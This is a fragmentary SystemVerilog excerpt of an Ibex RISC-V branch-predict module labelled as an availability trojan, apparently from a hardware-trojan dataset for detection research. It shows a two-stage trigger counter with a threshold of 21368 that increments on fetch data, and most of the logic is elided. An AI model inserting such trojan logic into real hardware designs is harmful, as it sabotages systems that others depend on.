...
module ibex_branch_predict_trojan_Availability (
  input  logic clk_i,
  input  logic rst_ni,
  ...
  output logic [31:0] predict_branch_pc_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=21368)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 21368;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (|fetch_rdata_i) trojan_counter <= trojan_counter + 1;
